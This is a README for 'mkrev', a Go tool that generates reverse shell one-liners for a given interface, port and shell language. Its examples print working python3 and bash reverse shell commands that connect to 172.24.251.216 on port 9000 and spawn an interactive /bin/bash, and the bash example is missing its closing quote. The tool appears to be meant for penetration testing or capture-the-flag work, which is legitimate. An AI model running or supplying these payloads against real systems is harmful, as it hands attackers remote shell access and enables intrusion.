# Mkrev

A lazy tool to generate reverse shell in quick and shorter way than browsing a cheatsheet!

## Installation

```
$ git clone https://github.com/fahmifj/mkrev.git
$ cd mkrev
$ go build -o mkrev main.go
```

For easy call, put the binary (mkrev) on your $HOME/bin then add new path `$ export $PATH=$HOME/bin:$PATH`.

## Usage and examples

Usage is simple where some shell options are using shorter name.
- `py` for python
- `nc` for netcat
- `ps` for powershell
- `pl` for perl
- `rb` for ruby

```
$ mkrev
Usage:
        mkrev [interface] [port] [shell]
        mkrev tun0 9000 py
Shell:
        py, bash, nc, php, ps, pl, rb
```

1. Generate python reverse shell

```
$ mkrev eth0 9000 py
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.24.251.216",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
2. Generate bash reverse shell
```
$ mkrev eth0 9000 bash
bash -c "bash -i >& /dev/tcp/172.24.251.216/9000 0>&1
```